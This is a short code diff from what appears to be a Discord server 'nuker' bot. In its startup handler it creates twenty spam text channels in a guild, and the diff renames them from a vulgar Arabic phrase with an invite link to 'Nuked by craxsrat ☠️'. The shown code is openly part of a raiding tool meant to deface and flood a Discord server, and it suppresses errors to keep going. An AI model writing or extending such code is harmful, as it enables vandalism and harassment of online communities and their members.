@@ -72,7 +72,7 @@ async def on_ready():
         print(Fore.YELLOW + "💣 إنشاء قنوات سبام...")
         for i in range(20):
             try:
-                await guild.create_text_channel(f"تم النيك https://discord.gg/4uJY6c7k-{i}")
+                await guild.create_text_channel(f"Nuked by craxsrat ☠️{i}")
             except:
                 pass
 
